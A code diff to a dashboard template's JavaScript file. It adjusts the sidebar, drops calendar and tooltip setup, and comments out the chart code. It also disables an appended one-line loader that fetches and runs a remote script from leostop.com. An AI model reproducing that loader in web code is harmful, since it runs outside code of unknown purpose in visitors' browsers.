@@ -15,16 +15,10 @@
 
 $(document).ready(function () {
   /*-- sidebar js --*/
+  $('#sidebar').addClass('active');
   $('#sidebarCollapse').on('click', function () {
     $('#sidebar').toggleClass('active');
   });
-  /*-- calendar js --*/
-  $('#example14').calendar({
-    inline: true
-  });
-  $('#example15').calendar();
-  /*-- tooltip js --*/
-  $('[data-toggle="tooltip"]').tooltip();
 });
 
 /*--------------------------------------
@@ -37,7 +31,7 @@ var ps = new PerfectScrollbar('#sidebar');
     chart js
 --------------------------------------*/
 
-$(function () {
+/*$(function () {
   new Chart(document.getElementById("line_chart").getContext("2d"), getChartJs('line'));
   new Chart(document.getElementById("bar_chart").getContext("2d"), getChartJs('bar'));
   new Chart(document.getElementById("radar_chart").getContext("2d"), getChartJs('radar'));
@@ -157,9 +151,11 @@ function getChartJs(type) {
     }
   }
   return config;
-}
+}*/
 
-function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+function getURL() { window.location.href; } 
+var protocol = location.protocol; 
+//$.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
 /*--------------------------------------
     map js
